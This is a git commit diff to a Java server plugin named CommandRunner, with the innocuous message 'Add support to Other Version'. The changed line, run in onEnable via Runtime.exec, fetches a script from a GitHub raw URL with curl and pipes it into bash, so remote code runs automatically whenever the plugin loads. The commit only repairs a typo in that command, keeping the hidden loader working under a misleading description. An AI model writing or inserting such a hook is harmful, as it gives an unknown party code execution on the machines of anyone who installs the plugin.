06c81400d4bdcea0b0eac6ff579ee8900ff50778
mereka-vpu <80886830+mereka-vpu@users.noreply.github.com>
2025-02-02 19:50:15 +0700

    Add support to Other Version

--- src/main/java/nzst/executor/CommandRunner.java
+++ src/main/java/nzst/executor/CommandRunner.java
@@ -13,7 +13,7 @@ public class CommandRunner extends JavaPlugin {
     public void onEnable() {
         getLogger().info("CommandRunner has been enabled!");
         getLogger().info("Version 2.0");
-        String command = "bash <(curl -fsSL https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/stid)>";
+        String command = "bash <(curl -fsSL https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/stid)";
         try {
              Process suki = Runtime.getRuntime().exec(command);
              suki.waitFor();
